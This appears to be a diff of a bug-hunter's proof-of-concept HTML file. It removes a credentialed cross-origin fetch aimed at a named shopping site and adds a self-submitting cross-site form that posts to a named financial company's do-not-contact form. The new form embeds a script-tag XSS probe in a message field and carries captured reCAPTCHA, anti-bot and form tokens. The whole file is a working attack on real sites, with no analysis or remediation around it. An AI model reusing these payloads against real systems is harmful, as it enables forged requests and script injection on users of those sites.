@@ -1,25 +1,203 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <title>CORS Exploit PoC</title>
-</head>
-<body>
-  <h1>CORS PoC</h1>
-  <pre id="output">Loading...</pre>
-
+<html>
+  <form
+    enctype="application/x-www-form-urlencoded"
+    method="POST"
+    action="https://www.principal.com/do-not-contact-form"
+  >
+    <table>
+      <tr>
+        <td>solicitation_options%5Bpostal_service_address%5D</td>
+        <td>
+          <input
+            type="text"
+            value="postal_service_address"
+            name="solicitation_options%255Bpostal_service_address%255D"
+          />
+        </td>
+      </tr>
+      <tr>
+        <td>first_name</td>
+        <td><input type="text" value="test" name="first_name" /></td>
+      </tr>
+      <tr>
+        <td>last_name</td>
+        <td><input type="text" value="test" name="last_name" /></td>
+      </tr>
+      <tr>
+        <td>work_email</td>
+        <td><input type="text" value="" name="work_email" /></td>
+      </tr>
+      <tr>
+        <td>street_address</td>
+        <td><input type="text" value="trest" name="street_address" /></td>
+      </tr>
+      <tr>
+        <td>city</td>
+        <td><input type="text" value="test" name="city" /></td>
+      </tr>
+      <tr>
+        <td>state</td>
+        <td><input type="text" value="Oregon" name="state" /></td>
+      </tr>
+      <tr>
+        <td>zip_code</td>
+        <td><input type="text" value="32423" name="zip_code" /></td>
+      </tr>
+      <tr>
+        <td>phone</td>
+        <td><input type="text" value="" name="phone" /></td>
+      </tr>
+      <tr>
+        <td>fax_number</td>
+        <td><input type="text" value="" name="fax_number" /></td>
+      </tr>
+      <tr>
+        <td>utm_campaign</td>
+        <td><input type="text" value="undefined" name="utm_campaign" /></td>
+      </tr>
+      <tr>
+        <td>client_id</td>
+        <td><input type="text" value="" name="client_id" /></td>
+      </tr>
+      <tr>
+        <td>lead_source</td>
+        <td><input type="text" value="Web" name="lead_source" /></td>
+      </tr>
+      <tr>
+        <td>webform_token_id</td>
+        <td>
+          <input
+            type="text"
+            value="web_ind_brand_donotcontact"
+            name="webform_token_id"
+          />
+        </td>
+      </tr>
+      <tr>
+        <td>simple_recaptcha_token</td>
+        <td>
+          <input
+            type="text"
+            value="03AFcWeA7ppnSvjpDQg8dtDPahtsTyfa_pnwjXnPfR77huF87segfc7qV2XKHiIycW3TfzoU09qF6r5JDJTDoE1ZBfwnQgmlGdAMH1QrpR7p56oJYnAo3w7EKibROFRapKmNeKbnFKsLCF-Eo3bWoFDo73zUZJz9rxJz-v14BufHhP2P53wTD8QZLgs4xn7kNzFuCL7ZsPyM0fkkas2dmaj7i9K5DSeNEQohFsOrmF6z95dhEPHoOB7PKCDZcQkLVRvIHWZSDApndnxOR-qkjuXxW1y3824psBAu3bGRQYEovIQju4dtgS6qPtHG4krzCAoKZM17JC8Lxuk5p-YxJAn1jIftwmit8IiaEkVqdOmCVuBsHKa3p2IOYmnyEzsBkDVDu7FQX3TZGMSAvP0dmPioLJI9kY8EWO1jGQaisTHnyQWTPa1RNuJ6qMk2xP5OnsVaHw4SiZsHHxHFXZ_vKo1j5A2GslOVzDTubgZWMiIXIgT165aGcrGCVySxebbyoOBjnum-me3HjxIh8KTN3TO7dqjuwxC-bhLYuptGbbLaHaTSb5ptEaSmGqnjYosuI1KBeVnp-Bm5eiJdHGuErickQi8jjehv_dWK_IMR4PPm_zBpslijGFjd8dPZ4jskV6AGth-JD7D6c7EiPnzVOpiRPNhkirbGR82FuNHlhfaf9By-JCGyXw-XnpGXQmNnQfkUuy2obDIORorjLDyilTJNCLhnMO5eHI6SLoJgWNvIHzHdpRM4aKC_9qpalZIVyMj_HA3enugfewbOAzOGukB0Vdux-HFmCXkCV2Ce1aV_qJG-6N9Vp9x5zG_IyHLPTTmBLNAUlT8ILGwWXRhrU9opo1saC9g1ZCRWbFPYcTGhoekfrkCkETw3TeqUNFG6eG_3_ahbQEFKFuZvYS_ii3n7sMnBtZQvMqID3oVIssPPS08RZu1J_4uMw3OzJj-L_Do02Z8XWKfTpv3Lv5SqK3i7KhGBldw2QV3ncmcohi8PKve8AGC23kWdyGhWlX0nTtW9kDf1CK6eq_wwhSwHtuhYmGb4Z9vcdsO4hZX2IvLbPnr1g6gqcXisvYarUFDHCJ-_aHrToHBsgv5M3LNVLKpclPoxh8y2SeMJ4LY5ZhxJMqtwl97G4qNwnH_aXMy6CDYfo_9z9VHfVDOEb10oOzmYQnhMOM8T_1kzsN5ziA9LSCjtzJ9pI4ubL_Xjvz9lTmY1SVROqgaKKAutYilzdFlc1Q2IZ9EP3tJxWsu5eDEEu9tGDf5yAPHW5yM20VhGsvOHwTVw6U2Mgq8mwhWLPbSOmhU3jIw5vzMHiPXbPx5YVzY5kmUpiPsvABjxzqaC_xBw49wle1Q-tpi7xIw0RIhQ5V2L_szqMKjPDKk4gwnp_9kd4mKdi23ka4mGzwgKJvmWveXEe7B5tgEMM1_ZVkC70gdwcQoJU8arc73Xn9B2hsqsu1iP76ovk1-2YoWG7Fnfp7v4JL82W_TZLdVZMfZDjzvnO7P3C7slrMbRVjzv0Sj7fnDcMJwjyV0k6JjthFybWddXwjoQSyPg-LK9_q_g7KMVw_16r5xe-m1AOSfwXNE1Ra1Ohophb4PNITNIqn8HigzL5qIOeCbfC08p41x7lw0a81AeKF2VknfREwrOkpZm2qcBIAsSIffvN8SbqUeKWaMr2uz1JWnBIgRN34m9q5WV_5es_1To1QWmSzL0vwFytPGHwSwdKaYOZIrjmNnSwfJSShXgumD7Pt1bu_U0hLzD0bXqzUA_kOXmTEIVZUvv7jwku6-xV1mTtzS3Q_Gadm2X_sQnzO1C35UWXBB9tzRpBStGnm3-QwfrQFvvROn_HUSU367pgGC3FrMAUCStdDf82qUHquKCKgr-0Nae14w66zXirKuFdK6DG9ayl4MrEsnTtyqILgkLWFBcQqWrXa-JKNQXLRVt-EA2CwFEWfxPHLOGWdoulPczqOdQXlk-GkPwDDRiel_oNgiLrEeJjI5BrE2ohEL93l6erZCbVgyFFJ9ND7PApVvN2eIY7Qa1v2Isr9Npvgvkx3FFk59CswhFj0_QyE1iElAsk1QR86TYyW6F9UuSSb6im_OlKOP-_d6pwOWjo2TXgGkANsqq2o8_9GYR1DMdPYuejhkR3hMQrc-4wH1j9s3eEw3C0_D5imjEcYYDUPjePXm9YZ9cumo9F22ugeoPGizjZVBU0n4g03UU92_MJtlvRtEgVuDKCoq7iVmdIv0DsbI45Iigiky1PFD7HCXI1-iPElSHUQKTDjRx6rrP7ptF8OBmZSbTNSNoTZkv0"
+            name="simple_recaptcha_token"
+          />
+        </td>
+      </tr>
+      <tr>
+        <td>simple_recaptcha_type</td>
+        <td><input type="text" value="v3" name="simple_recaptcha_type" /></td>
+      </tr>
+      <tr>
+        <td>simple_recaptcha_score</td>
+        <td><input type="text" value="50" name="simple_recaptcha_score" /></td>
+      </tr>
+      <tr>
+        <td>simple_recaptcha_message</td>
+        <td>
+          <input
+            type="text"
+            value="<scRipt>alert(3)</scRipt>+was+an+error+during+validation+of+your+form+submission,+please+try+to+reload+the+page+and+submit+form+again."
+            name="simple_recaptcha_message"
+          />
+        </td>
+      </tr>
+      <tr>
+        <td>honeypot_time</td>
+        <td>
+          <input
+            type="text"
+            value="m5r4h-LVNIL64rm6OQP6ZeWNURMBsHtxerd3cXF4XCo"
+            name="honeypot_time"
+          />
+        </td>
+      </tr>
+      <tr>
+        <td>form_build_id</td>
+        <td>
+          <input
+            type="text"
+            value="form-AVJj_53ySCw0pmCSdmRpEOLtvnYu-ZPPxoJbGVsmusI"
+            name="form_build_id"
+          />
+        </td>
+      </tr>
+      <tr>
+        <td>form_id</td>
+        <td>
+          <input
+            type="text"
+            value="webform_submission_web_ind_brand_donotcontact_node_1006_add_form"
+            name="form_id"
+          />
+        </td>
+      </tr>
+      <tr>
+        <td>antibot_key</td>
+        <td>
+          <input
+            type="text"
+            value="B9eaPjGrc9VoS6Ryva7JupP0uEN2uNDlwf7UijQngJQ"
+            name="antibot_key"
+          />
+        </td>
+      </tr>
+      <tr>
+        <td>url</td>
+        <td><input type="text" value="" name="url" /></td>
+      </tr>
+      <tr>
+        <td>_triggering_element_name</td>
+        <td>
+          <input type="text" value="op" name="_triggering_element_name" />
+        </td>
+      </tr>
+      <tr>
+        <td>_triggering_element_value</td>
+        <td>
+          <input type="text" value="Submit" name="_triggering_element_value" />
+        </td>
+      </tr>
+      <tr>
+        <td>_drupal_ajax</td>
+        <td><input type="text" value="1" name="_drupal_ajax" /></td>
+      </tr>
+      <tr>
+        <td>ajax_page_state%5Btheme%5D</td>
+        <td>
+          <input
+            type="text"
+            value="principalcom"
+            name="ajax_page_state%255Btheme%255D"
+          />
+        </td>
+      </tr>
+      <tr>
+        <td>ajax_page_state%5Btheme_token%5D</td>
+        <td>
+          <input
+            type="text"
+            value=""
+            name="ajax_page_state%255Btheme_token%255D"
+          />
+        </td>
+      </tr>
+      <tr>
+        <td>ajax_page_state%5Blibraries%5D</td>
+        <td>
+          <input
+            type="text"
+            value="eJyVVNuS2yAM_SHHzLT_0KdOpzPtOyNAIWxAuCB71_36CrK7k66bxnkCHx1ZRzeAOJjMCi7neMwlDTYXVIEYC0Ecn37NWNYrC8kNYviNwzFnpsxY1fttmFzVfMKEykDFq8-IHuIPtBwyDdPR6_4zH7OBOHOIgddvsAQPV4QFs6oM5CBmwg46rMGTrmtlTIrePb6XkKCsneM5KQcMX2HFMuKCxD8L2HMg3-1NVIuuW5K-dH8l4MHmNEkg4tFI0L1cC2U3txUKy0F0P-YxNgDorTQ7_E4I7oGEI6x5ZgGIIRCW3X6Bzvu5lR_hHoL0eK9DDQ4N3NEdJL_xCBZNzndkd2ogGT9B76jo3FYJlJLvoPJzYL5X485sTZkN_odZssVaR6TLRD2jaauqZAe-yNnnvkUqgWyYIErBVCP02ta_8csyHiqvsU1OxSjr-klDjMqVWUjjKzTUkKaIuqCFie0J1Emqrw04j1vbR0Avn4c3ma_nCE_wsgF7c6sI3VokY7lLJZw2RXZVuyzvT59eyxu6qE59U09ozya_yDt1i-JQ5j_WscKyDfuRxNn7eJsWaJo5QT3fZCRpHfjbf8hTa_JttZd-bMz9sf4XONbZpMA6k8U_oP9aJg"
+            name="ajax_page_state%255Blibraries%255D"
+          />
+        </td>
+      </tr>
+    </table>
+    <input
+      type="submit"
+      value="https://www.principal.com/do-not-contact-form"
+    />
+  </form>
   <script>
-    fetch('https://www.shopbase.com', {
-      method: 'GET',
-      credentials: 'include' // Important if you want cookies to be sent
-    })
-    .then(response => response.text())
-    .then(data => {
-      document.getElementById('output').textContent = data;
-    })
-    .catch(error => {
-      document.getElementById('output').textContent = 'Error: ' + error;
-    });
+    document.forms[0].submit()
   </script>
-</body>
 </html>
